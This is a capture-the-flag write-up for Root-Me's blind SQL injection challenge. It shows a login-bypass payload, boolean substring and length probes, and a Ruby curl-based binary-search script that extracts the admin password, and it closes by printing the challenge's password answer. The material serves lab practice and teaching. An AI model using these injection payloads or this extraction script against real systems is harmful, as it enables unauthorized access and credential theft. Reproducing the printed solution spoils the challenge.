# [SQL Injection Blind](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-blind)

So here, we got a blind SQL injection, meaning we can't see the results of our query, malicious 
or otherwise. We have to use what IS returned to infer about the success or failure of our 
query.

If we type a random user/pass like "admin:admin"

We get "No such user/password"

Curiously we can bypass the login and get in as "admin" with: `admin' or 1=1-- `

But they don't give us the password, so we got to extract it.

So basically we have two end results:

A successful query returns "Welcome back admin"

An unsuccessful query returns "No such user/password"

We can use this to character by character extract the user password using brute force.

If we made a query like this:

`admin' and substr(password,1,1) = 'a'-- `

This would only be successful if the first character of the admin password was 'a'.

Let's figure out how long the password is first!

`admin' and strlen(password) > 10-- `

That returns an error so we know the length of the password is less than 10. We can iterate 
through the numbers 9 down to 1 until we find our password length. It is 8 characters!

Let's script a brute forcer!

```ruby
require 'net/http'

allChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".chars.sort
pass = ""
url = "http://challenge01.root-me.org/web-serveur/ch10/"

8.times do |i|
  charset = allChars
  while charset.length > 1
    curr = (charset.length - 1) /2
    char = charset[curr]
    puts "Password(#{i+1}/8): #{pass}, Testing: #{char}"
    injection = "username=admin%27+and+substr%28password,1,#{pass.length+1}%29"
    # %3E >
    # check if current password substring > pass + char
    injection += "%3E%27#{pass+char}%27--+&password=anything"
    req = `curl "#{url}" -H 'Cookie: uid=wxxxxxxxxxxxxxxxxxxxxx==' --data '#{injection}'`

    if req.include? "no such user/password" # substring is less than or equal
      charset = charset[0..curr]
    else
      charset = charset[(curr+1)..-1]
    end

    system('clear')
  end
  pass += charset[0]
end

puts "Password for admin: #{pass}"
```

Because I am using binary search and it's only 8 characters long, this takes less than 15 seconds.

Password is: **e2azO93I**
